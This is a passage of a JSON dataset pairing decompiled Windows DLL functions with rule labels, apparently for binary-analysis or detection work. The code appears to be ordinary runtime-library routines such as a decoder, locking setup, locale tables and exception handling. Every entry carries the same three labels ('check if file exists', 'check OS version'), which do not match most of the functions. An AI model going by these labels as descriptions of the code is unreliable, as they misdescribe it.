\"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[arg1[2]] >> 2 |\n                          \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[arg1[1]] << 4;\n                puVar8 = puVar8 + 1;\n            }\n            if (3 < uVar4) {\n                *puVar8 = \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[arg1[2]] << 6 |\n                          \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[arg1[3]];\n                puVar8 = puVar8 + 1;\n            }\n            *puVar8 = 0;\n            *arg2 = (uVar7 + 3 >> 2) * 3 - (-uVar4 & 3);\n            return puVar6;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 920
    },
    "18007493": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180074934(ulong arg1)\n\n{\n    code *pcVar1;\n    \n    if (0 < arg1) {\n        if (arg1 < 3) {\n            fcn.180074970(6);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (arg1 == 3) {\n            fcn.180074970(0);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (arg1 == 4) {\n            fcn.180074970(1);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    fcn.1800be074();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 185
    },
    "1800749d": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\ncode ** fcn.1800749d0(code **arg1)\n\n{\n    code **ppcVar1;\n    \n    if (-1 < *0x18012878c) {\n        if (*0x18012878c < 2) {\n            if (*0x180128888 != 0) {\n                *arg1 = vtable.Concurrency::details::stl_critical_section_win7.0;\n    // WARNING: Could not recover jumptable at 0x0001800754ff. Too many branches\n    // WARNING: Treating indirect jump as call\n                ppcVar1 = (**0x1800de8f0)(arg1 + 1);\n                return ppcVar1;\n            }\n        }\n        else if (*0x18012878c != 2) goto code_r0x0001800749e4;\n        if (*0x180128858 != 0) {\n            *arg1 = vtable.Concurrency::details::stl_critical_section_vista.0;\n            if (*0x1801287b0 != 0) {\n    // WARNING: Could not recover jumptable at 0x0001800754e0. Too many branches\n    // WARNING: Treating indirect jump as call\n                ppcVar1 = (**0x1800de8f0)();\n                return ppcVar1;\n            }\n            (**0x1800de4e0)(arg1 + 1, 4000, 0);\n            return 0x1;\n        }\n    }\ncode_r0x0001800749e4:\n    *arg1 = vtable.Concurrency::details::stl_critical_section_concrt.0;\n    arg1[6] = NULL;\n    arg1[7] = NULL;\n    arg1[1] = NULL;\n    arg1[2] = NULL;\n    arg1[4] = NULL;\n    *(arg1 + 3) = 2;\n    *(arg1 + 5) = 0;\n    *(arg1 + 0x2c) = 0;\n    return arg1 + 1;\n}\n",
        "token_count": 453
    },
    "18007f20": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18007f204(int64_t arg1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    char cVar6;\n    uint *puVar8;\n    int64_t arg3;\n    char *pcVar9;\n    int64_t iVar10;\n    char *pcVar11;\n    int64_t iVar12;\n    int64_t iVar13;\n    char in_R8B;\n    uchar *puVar14;\n    uchar auStack80 [56];\n    uint32_t uVar7;\n    \n    puVar14 = auStack80;\n    puVar8 = fcn.180074580(puVar14);\n    uVar3 = puVar8[1];\n    uVar4 = puVar8[2];\n    uVar5 = puVar8[3];\n    *(arg1 + 0x48) = *puVar8;\n    *(arg1 + 0x4c) = uVar3;\n    *(arg1 + 0x50) = uVar4;\n    *(arg1 + 0x54) = uVar5;\n    uVar3 = puVar8[5];\n    uVar4 = puVar8[6];\n    uVar5 = puVar8[7];\n    *(arg1 + 0x58) = puVar8[4];\n    *(arg1 + 0x5c) = uVar3;\n    *(arg1 + 0x60) = uVar4;\n    *(arg1 + 100) = uVar5;\n    *(arg1 + 0x68) = *(puVar8 + 8);\n    *(arg1 + 0x70) = puVar8[10];\n    arg3 = fcn.1800bb800(puVar14);\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x28) = 0;\n    *(arg1 + 0x30) = 0;\n    puVar14 = *(arg3 + 0x38);\n    iVar12 = -1;\n    do {\n        iVar13 = iVar12;\n        iVar12 = iVar13 + 1;\n    } while (puVar14[iVar12] != '\\0');\n    iVar13 = iVar13 + 2;\n    iVar12 = fcn.1800bb064(iVar13, 1);\n    if (iVar12 != 0) {\n        if (iVar13 != 0) {\n            iVar10 = iVar12 - puVar14;\n            do {\n                puVar14[iVar10] = *puVar14;\n                puVar14 = puVar14 + 1;\n                iVar13 = iVar13 + -1;\n            } while (iVar13 != 0);\n        }\n        *(arg1 + 0x10) = iVar12;\n        fcn.180075a68(arg1, 0, arg3);\n        cVar1 = *(arg1 + 0x44);\n        if (cVar1 == '\\0') {\n            cVar6 = *(arg3 + 0x51);\n        }\n        else {\n            cVar6 = *(arg3 + 0x50);\n        }\n        uVar7 = cVar6;\n        if (0x7e < uVar7) {\n            uVar7 = 0;\n        }\n        *(arg1 + 0x38) = uVar7;\n        pcVar11 = \"$+xv\";\n        if ((((cVar1 == '\\0') && (*(arg3 + 0x53) < 3)) && (*(arg3 + 0x52) < 2)) && (*(arg3 + 0x56) < 5)) {\n            pcVar9 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                     + (*(arg3 + 0x56) + (*(arg3 + 0x52) + *(arg3 + 0x53) * 2) * 5) * 4;\n        }\n        else {\n            pcVar9 = \"$+xv\";\n        }\n        *(arg1 + 0x3c) = *pcVar9;\n        if (((cVar1 == '\\0') && (*(arg3 + 0x55) < 3)) && ((*(arg3 + 0x54) < 2 && (*(arg3 + 0x57) < 5)))) {\n            pcVar11 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                      + (*(arg3 + 0x57) + (*(arg3 + 0x54) + *(arg3 + 0x55) * 2) * 5) * 4;\n        }\n        *(arg1 + 0x40) = *pcVar11;\n        if (in_R8B != '\\0') {\n            *(arg1 + 0x3c) = 0x76782b24;\n            *(arg1 + 0x40) = 0x76782b24;\n        }\n        return;\n    }\n    fcn.18006df20();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1268
    },
    "18007f39": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18007f39c(int64_t arg1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    char cVar6;\n    uint *puVar8;\n    int64_t arg3;\n    char *pcVar9;\n    int64_t iVar10;\n    char *pcVar11;\n    int64_t iVar12;\n    int64_t iVar13;\n    char in_R8B;\n    uchar *puVar14;\n    uchar auStack80 [56];\n    uint32_t uVar7;\n    \n    puVar14 = auStack80;\n    puVar8 = fcn.180074580(puVar14);\n    uVar3 = puVar8[1];\n    uVar4 = puVar8[2];\n    uVar5 = puVar8[3];\n    *(arg1 + 0x48) = *puVar8;\n    *(arg1 + 0x4c) = uVar3;\n    *(arg1 + 0x50) = uVar4;\n    *(arg1 + 0x54) = uVar5;\n    uVar3 = puVar8[5];\n    uVar4 = puVar8[6];\n    uVar5 = puVar8[7];\n    *(arg1 + 0x58) = puVar8[4];\n    *(arg1 + 0x5c) = uVar3;\n    *(arg1 + 0x60) = uVar4;\n    *(arg1 + 100) = uVar5;\n    *(arg1 + 0x68) = *(puVar8 + 8);\n    *(arg1 + 0x70) = puVar8[10];\n    arg3 = fcn.1800bb800(puVar14);\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x28) = 0;\n    *(arg1 + 0x30) = 0;\n    puVar14 = *(arg3 + 0x38);\n    iVar12 = -1;\n    do {\n        iVar13 = iVar12;\n        iVar12 = iVar13 + 1;\n    } while (puVar14[iVar12] != '\\0');\n    iVar13 = iVar13 + 2;\n    iVar12 = fcn.1800bb064(iVar13, 1);\n    if (iVar12 != 0) {\n        if (iVar13 != 0) {\n            iVar10 = iVar12 - puVar14;\n            do {\n                puVar14[iVar10] = *puVar14;\n                puVar14 = puVar14 + 1;\n                iVar13 = iVar13 + -1;\n            } while (iVar13 != 0);\n        }\n        *(arg1 + 0x10) = iVar12;\n        fcn.18007f108(arg1, 0, arg3);\n        cVar1 = *(arg1 + 0x44);\n        if (cVar1 == '\\0') {\n            cVar6 = *(arg3 + 0x51);\n        }\n        else {\n            cVar6 = *(arg3 + 0x50);\n        }\n        uVar7 = cVar6;\n        if (0x7e < uVar7) {\n            uVar7 = 0;\n        }\n        *(arg1 + 0x38) = uVar7;\n        pcVar11 = \"$+xv\";\n        if ((((cVar1 == '\\0') && (*(arg3 + 0x53) < 3)) && (*(arg3 + 0x52) < 2)) && (*(arg3 + 0x56) < 5)) {\n            pcVar9 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                     + (*(arg3 + 0x56) + (*(arg3 + 0x52) + *(arg3 + 0x53) * 2) * 5) * 4;\n        }\n        else {\n            pcVar9 = \"$+xv\";\n        }\n        *(arg1 + 0x3c) = *pcVar9;\n        if (((cVar1 == '\\0') && (*(arg3 + 0x55) < 3)) && ((*(arg3 + 0x54) < 2 && (*(arg3 + 0x57) < 5)))) {\n            pcVar11 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                      + (*(arg3 + 0x57) + (*(arg3 + 0x54) + *(arg3 + 0x55) * 2) * 5) * 4;\n        }\n        *(arg1 + 0x40) = *pcVar11;\n        if (in_R8B != '\\0') {\n            *(arg1 + 0x3c) = 0x76782b24;\n            *(arg1 + 0x40) = 0x76782b24;\n        }\n        return;\n    }\n    fcn.18006df20();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1269
    },
    "18008bd5": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18008bd50(int64_t arg1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    char cVar6;\n    uint *puVar8;\n    int64_t arg3;\n    char *pcVar9;\n    int64_t iVar10;\n    char *pcVar11;\n    int64_t iVar12;\n    int64_t iVar13;\n    char in_R8B;\n    uchar *puVar14;\n    uchar auStack80 [56];\n    uint32_t uVar7;\n    \n    puVar14 = auStack80;\n    puVar8 = fcn.180074580(puVar14);\n    uVar3 = puVar8[1];\n    uVar4 = puVar8[2];\n    uVar5 = puVar8[3];\n    *(arg1 + 0x48) = *puVar8;\n    *(arg1 + 0x4c) = uVar3;\n    *(arg1 + 0x50) = uVar4;\n    *(arg1 + 0x54) = uVar5;\n    uVar3 = puVar8[5];\n    uVar4 = puVar8[6];\n    uVar5 = puVar8[7];\n    *(arg1 + 0x58) = puVar8[4];\n    *(arg1 + 0x5c) = uVar3;\n    *(arg1 + 0x60) = uVar4;\n    *(arg1 + 100) = uVar5;\n    *(arg1 + 0x68) = *(puVar8 + 8);\n    *(arg1 + 0x70) = puVar8[10];\n    arg3 = fcn.1800bb800(puVar14);\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x28) = 0;\n    *(arg1 + 0x30) = 0;\n    puVar14 = *(arg3 + 0x38);\n    iVar12 = -1;\n    do {\n        iVar13 = iVar12;\n        iVar12 = iVar13 + 1;\n    } while (puVar14[iVar12] != '\\0');\n    iVar13 = iVar13 + 2;\n    iVar12 = fcn.1800bb064(iVar13, 1);\n    if (iVar12 != 0) {\n        if (iVar13 != 0) {\n            iVar10 = iVar12 - puVar14;\n            do {\n                puVar14[iVar10] = *puVar14;\n                puVar14 = puVar14 + 1;\n                iVar13 = iVar13 + -1;\n            } while (iVar13 != 0);\n        }\n        *(arg1 + 0x10) = iVar12;\n        fcn.1800893a8(arg1, 0, arg3);\n        cVar1 = *(arg1 + 0x44);\n        if (cVar1 == '\\0') {\n            cVar6 = *(arg3 + 0x51);\n        }\n        else {\n            cVar6 = *(arg3 + 0x50);\n        }\n        uVar7 = cVar6;\n        if (0x7e < uVar7) {\n            uVar7 = 0;\n        }\n        *(arg1 + 0x38) = uVar7;\n        pcVar11 = \"$+xv\";\n        if ((((cVar1 == '\\0') && (*(arg3 + 0x53) < 3)) && (*(arg3 + 0x52) < 2)) && (*(arg3 + 0x56) < 5)) {\n            pcVar9 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                     + (*(arg3 + 0x56) + (*(arg3 + 0x52) + *(arg3 + 0x53) * 2) * 5) * 4;\n        }\n        else {\n            pcVar9 = \"$+xv\";\n        }\n        *(arg1 + 0x3c) = *pcVar9;\n        if (((cVar1 == '\\0') && (*(arg3 + 0x55) < 3)) && ((*(arg3 + 0x54) < 2 && (*(arg3 + 0x57) < 5)))) {\n            pcVar11 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                      + (*(arg3 + 0x57) + (*(arg3 + 0x54) + *(arg3 + 0x55) * 2) * 5) * 4;\n        }\n        *(arg1 + 0x40) = *pcVar11;\n        if (in_R8B != '\\0') {\n            *(arg1 + 0x3c) = 0x76782b24;\n            *(arg1 + 0x40) = 0x76782b24;\n        }\n        return;\n    }\n    fcn.18006df20();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1269
    },
    "18009036": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.18009036c(uint64_t arg1, ulong arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t iVar5;\n    int64_t *arg1_00;\n    uint64_t uVar6;\n    \n    if (arg2 == 0) {\n        arg1 = arg1 & 0xffffffffffffff00;\n        if (0 < *0x180129100) {\n            *0x180129100 = *0x180129100 + -1;\n            uVar3 = fcn.18008fb94();\n            if (*0x180128b40 != 2) {\n                fcn.180090a48(7);\n                pcVar1 = swi(3);\n                uVar6 = (*pcVar1)();\n                return uVar6;\n            }\n            fcn.18008fcbc();\n            fcn.180090c50();\n            fcn.180090cc4();\n            *0x180128b40 = 0;\n            fcn.18008fcec();\n            uVar6 = arg1 & 0xffffffffffffff00 | uVar3;\n            fcn.18008fe70(uVar6);\n            cVar4 = fcn.18008fe94(uVar6 & 0xffffffffffffff00 | arg3 != 0, 0);\n            if (cVar4 != '\\0') {\n                return 1;\n            }\n        }\n        return 0;\n    }\n    if (arg2 != 1) {\n        if (arg2 == 2) {\n            uVar3 = fcn.18008fc1c();\n        }\n        else {\n            if (arg2 != 3) {\n                return 1;\n            }\n            uVar3 = fcn.18008fc44();\n        }\n        return uVar3;\n    }\n    uVar6 = 0;\n    cVar4 = fcn.18008fd00(0);\n    if (cVar4 != '\\0') {\n        uVar3 = fcn.18008fb94();\n        bVar2 = true;\n        if (*0x180128b40 != 0) {\n            fcn.180090a48(7);\n            pcVar1 = swi(3);\n            uVar6 = (*pcVar1)();\n            return uVar6;\n        }\n        *0x180128b40 = 1;\n        cVar4 = fcn.18008fc04();\n        if (cVar4 != '\\0') {\n            fcn.180090c88();\n            fcn.180090c40();\n            fcn.180090c64();\n            uVar6 = 0x1800de9e0;\n            iVar5 = fcn.1800c19f8(0x1800de9e0, 0x1800dea10);\n            if ((iVar5 == 0) && (cVar4 = fcn.18008fbd0(),  cVar4 != '\\0')) {\n                uVar6 = 0x1800de8f8;\n                fcn.1800c1994(0x1800de8f8, 0x1800de9d8);\n                *0x180128b40 = 2;\n                bVar2 = false;\n            }\n        }\n        fcn.18008fe70(uVar6 & 0xffffffffffffff00 | uVar3);\n        if (!bVar2) {\n            arg1_00 = fcn.180090c80();\n            if ((*arg1_00 != 0) && (cVar4 = fcn.18008fdd8(arg1_00),  cVar4 != '\\0')) {\n                (**0x1800de8f0)(arg1, 2, arg3);\n            }\n            *0x180129100 = *0x180129100 + 1;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 870
    },
    "1800af60": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_bp_28h\n// WARNING: Variable defined which should be unmapped: var_bp_30h\n// WARNING: Variable defined which should be unmapped: var_bp_38h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800af60c(int32_t *arg1, ulong arg2, ulong arg3, int32_t *arg4, ulong *noname_4, ulong noname_5, \n                  uint64_t noname_6, int32_t *noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11\n                  , ulong noname_12, ulong noname_13, ulong noname_14, ulong noname_15, ulong arg_90h, ulong arg_98h, \n                  ulong arg_a0h, ulong arg_a8h)\n\n{\n    int64_t iVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    char cVar6;\n    char cVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int64_t iVar10;\n    ulong uVar11;\n    uint32_t uVar12;\n    uint64_t uVar13;\n    ulong var_8h_2;\n    ulong var_10h;\n    uchar auStack360 [32];\n    ulong *puStack328;\n    ulong *puStack320;\n    ulong uStack312;\n    ulong uStack304;\n    uint64_t uStack296;\n    int32_t *piStack288;\n    char cStack280;\n    char cStack272;\n    char cStack264;\n    char cStack263;\n    int32_t iStack260;\n    ulong uStack256;\n    int32_t *piStack248;\n    ulong uStack240;\n    int64_t iStack232;\n    int32_t *piStack224;\n    uint64_t uStack216;\n    int64_t iStack208;\n    int32_t iStack200;\n    int32_t iStack196;\n    int32_t iStack192;\n    uint32_t uStack188;\n    int32_t iStack184;\n    ulong *puStack176;\n    ulong uStack168;\n    uint uStack160;\n    uint uStack156;\n    uint32_t uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    ulong var_80h;\n    ulong var_bp_78h;\n    ulong var_70h;\n    ulong var_bp_68h;\n    ulong var_bp_60h;\n    ulong var_58h;\n    uint64_t var_bp_50h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_bp_38h;\n    ulong var_bp_30h;\n    ulong var_bp_28h;\n    ulong var_10h_2;\n    ulong var_8h;\n    \n    var_bp_50h = *0x180123080 ^ auStack360;\n    cVar7 = '\\0';\n    piStack224 = noname_7;\n    cStack263 = '\\0';\n    cStack264 = '\\0';\n    uStack256 = arg3;\n    uStack240 = arg2;\n    uVar8 = fcn.1800b04e4(arg2, arg4, noname_4);\n    if ((uVar8 < -1) || (*(noname_4 + 4) <= uVar8)) goto code_r0x0001800afae1;\n    if ((*arg1 == -0x1f928c9d) && (((arg1[6] == 4 && (arg1[8] + 0xe66cfae0U < 3)) && (*(arg1 + 0xc) == 0)))) {\n        iVar10 = fcn.1800aefd4();\n        if (*(iVar10 + 0x20) == 0) goto code_r0x0001800afa9d;\n        iVar10 = fcn.1800aefd4();\n        arg1 = *(iVar10 + 0x20);\n        iVar10 = fcn.1800aefd4();\n        cStack263 = '\\x01';\n        arg3 = *(iVar10 + 0x28);\n        uStack256 = arg3;\n        fcn.1800ada4c(*(arg1 + 0xe));\n        if (((*arg1 == -0x1f928c9d) && (arg1[6] == 4)) && ((arg1[8] + 0xe66cfae0U < 3 && (*(arg1 + 0xc) == 0))))\n        goto code_r0x0001800afae1;\n        iVar10 = fcn.1800aefd4();\n        if (*(iVar10 + 0x38) != 0) {\n            iVar10 = fcn.1800aefd4();\n            uVar11 = *(iVar10 + 0x38);\n            iVar10 = fcn.1800aefd4();\n            *(iVar10 + 0x38) = 0;\n            cVar6 = fcn.1800b057c(arg1, uVar11);\n            arg3 = uStack256;\n            if (cVar6 == '\\0') {\n                cVar7 = fcn.1800b066c(uVar11);\n                if (cVar7 != '\\0') {\n                    fcn.1800adbc0(arg1);\n                    fcn.1800b00c4(&var_bp_68h);\n                    fcn.1800add8c(&var_bp_68h, 0x18011f768);\n                    pcVar4 = swi(3);\n                    (*pcVar4)();\n                    return;\n                }\n                goto code_r0x0001800afae1;\n            }\n        }\n    }\n    uStack168 = *(arg4 + 2);\n    puStack176 = noname_4;\n    if (((*arg1 == -0x1f928c9d) && (arg1[6] == 4)) && (arg1[8] + 0xe66cfae0U < 3)) {\n        if (*(noname_4 + 0xc) != 0) {\n            puStack320 = puStack320 & 0xffffffff00000000 | noname_6 & 0xffffffff;\n            puStack328 = noname_4;\n            fcn.1800ad718(&uStack144, &puStack176, uVar8, arg4);\n            uStack160 = uStack144;\n            uStack156 = uStack140;\n            uStack152 = var_80h;\n            uStack148 = var_80h._4_4_;\n            if (var_80h < var_70h) {\n                iVar10 = CONCAT44(uStack140, uStack144);\n                iStack232 = iVar10;\n                do {\n                    iVar1 = *(*CONCAT44(uStack156, uStack160) + 0x10) + var_80h * 0x14;\n                    piVar2 = iVar1 + *(iVar10 + 8);\n                    iStack200 = *piVar2;\n                    iStack196 = piVar2[1];\n                    iStack192 = piVar2[2];\n                    uVar5 = piVar2[3];\n                    iStack184 = *(iVar1 + 0x10 + *(iVar10 + 8));\n                    uStack188 = uVar5;\n                    if ((iStack200 <= uVar8) && (uVar8 <= iStack196)) {\n                        iStack208 = iStack184 + *(arg4 + 2);\n                        uVar13 = 0;\n                        arg2 = uStack240;\n                        cVar7 = cStack264;\n                        if (uVar5 != 0) {\n                            do {\n                                puVar3 = iStack208 + uVar13 * 0x14;\n                                var_bp_68h._0_4_ = *puVar3;\n                                var_bp_68h._4_4_ = puVar3[1];\n                                var_bp_60h._0_4_ = puVar3[2];\n                                var_bp_60h._4_4_ = puVar3[3];\n                                var_58h._0_4_ = *(iStack208 + 0x10 + uVar13 * 0x14);\n                                iVar10 = fcn.1800ada20();\n                                piStack248 = iVar10 + 4 + *(*(arg1 + 0xc) + 0xc);\n                                iVar10 = fcn.1800ada20();\n                                iStack260 = *(iVar10 + *(*(arg1 + 0xc) + 0xc));\n                                arg2 = uStack240;\n                                iVar10 = iStack232;\n                                for (; uStack240 = arg2,  iStack232 = iVar10,  0 < iStack260; iStack260 = iStack260 + -1\n                                    ) {\n                                    iVar10 = fcn.1800ada20();\n                                    uStack216 = iVar10 + *piStack248;\n                                    iVar9 = fcn.1800afcfc(&var_bp_68h, uStack216, *(arg1 + 0xc));\n                                    arg2 = uStack240;\n                                    if (iVar9 != 0) {\n                                        cStack272 = noname_5;\n                                        cStack280 = cStack263;\n                                        piStack288 = piStack224;\n                                        uStack296 = uStack296 & 0xffffffff00000000 | noname_6 & 0xffffffff;\n                                        uStack304 = &iStack200;\n                                        uStack312 = uStack216;\n                                        puStack320 = &var_bp_68h;\n                                        puStack328 = noname_4;\n                                        cStack264 = '\\x01';\n                                        fcn.1800af538(arg1, uStack240, uStack256, arg4);\n                                        iVar10 = iStack232;\n                                        cVar7 = '\\x01';\n                                        goto code_r0x0001800af967;\n                                    }\n                                    piStack248 = piStack248 + 1;\n                                    iVar10 = iStack232;\n                                }\n                                uVar12 = uVar13 + 1;\n                                uVar13 = uVar12;\n                                cVar7 = cStack264;\n                            } while (uVar12 != uVar5);\n                        }\n                    }\ncode_r0x0001800af967:\n                    var_80h._0_4_ = var_80h + 1;\n                } while (var_80h < var_70h);\n                if (cVar7 != '\\0') goto code_r0x0001800afa91;\n            }\n        }\n        if (0x19930520 < (*noname_4 & 0x1fffffff)) {\n            if (*(noname_4 + 4) == 0) {\n                iVar10 = 0;\n            }\n            else {\n                iVar10 = fcn.1800ada0c();\n                iVar10 = iVar10 + *(noname_4 + 4);\n            }\n            if ((iVar10 != 0) ||\n               (((*(noname_4 + 0x24) >> 2 & 1) != 0 && (cVar7 = fcn.1800ad5bc(arg4, noname_4),  cVar7 == '\\0')))) {\n                if ((*(noname_4 + 0x24) >> 2 & 1) != 0) goto code_r0x0001800afae1;\n                if (*(noname_4 + 4) == 0) {\n                    iVar10 = 0;\n                }\n                else {\n                    iVar10 = fcn.1800ada0c();\n                    iVar10 = iVar10 + *(noname_4 + 4);\n                }\n                cVar7 = fcn.1800b057c(arg1, iVar10);\n                if (cVar7 == '\\0') {\n                    uVar11 = fcn.1800ad64c(arg2, arg4, noname_4, &uStack216);\n                    cStack280 = noname_5;\n                    uStack296 = 0;\n                    uStack304 = CONCAT44(uStack304._4_4_, 0xffffffff);\n                    uStack312 = CONCAT44(uStack312._4_4_, 0xffffffff);\n                    puStack320 = noname_4;\n                    puStack328 = NULL;\n                    piStack288 = arg4;\n                    fcn.1800ad858(arg2, arg1, uStack256, uVar11);\n                }\n            }\n        }\n    }\n    else if (*(noname_4 + 0xc) != 0) {\n        if (noname_5 != '\\0') goto code_r0x0001800afae1;\n        uStack304 = piStack224;\n        uStack312 = uStack312 & 0xffffffff00000000 | noname_6 & 0xffffffff;\n        puStack320 = puStack320 & 0xffffffff00000000 | uVar8;\n        puStack328 = noname_4;\n        fcn.1800afae8(arg1, arg2, arg3, arg4);\n    }\ncode_r0x0001800afa91:\n    iVar10 = fcn.1800aefd4();\n    if (*(iVar10 + 0x38) == 0) {\ncode_r0x0001800afa9d:\n        fcn.18008fb00(var_bp_50h ^ auStack360);\n        return;\n    }\ncode_r0x0001800afae1:\n    fcn.1800b1ebc();\n    pcVar4 = swi(3);\n    (*pcVar4)();\n    return;\n}\n",
        "token_count": 3013
    },
    "1800bfdf": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.1800bfdf0(void)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint64_t arg1;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    int64_t iVar11;\n    int32_t iVar12;\n    int64_t iStack72;\n    int64_t iStack64;\n    char cStack48;\n    \n    fcn.1800b1864(&iStack72, 0);\n    uVar6 = 0;\n    uVar7 = 0x2c0;\n    piVar1 = *(iStack64 + 0x120);\n    arg1 = uVar6;\n    uVar8 = uVar6;\n    do {\n        uVar9 = 0;\n        iVar12 = uVar8;\n        uVar8 = uVar7;\n        if (iVar12 == 1) {\n            arg1 = fcn.1800c3b20(uVar7);\n            if (arg1 == 0) break;\n            fcn.1800ae290(arg1, 0, uVar7);\n            uVar8 = 0x2c0;\n            uVar6 = uVar7;\n        }\n        iVar11 = arg1 - piVar1;\n        piVar10 = piVar1;\n        do {\n            if (iVar12 == 1) {\n                *(iVar11 + piVar10) = arg1 + uVar8;\n                iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4) != '\\0');\n            uVar9 = uVar9 + 1;\n            uVar8 = uVar8 + 1 + iVar4;\n            piVar10 = piVar10 + 1;\n        } while (uVar9 < 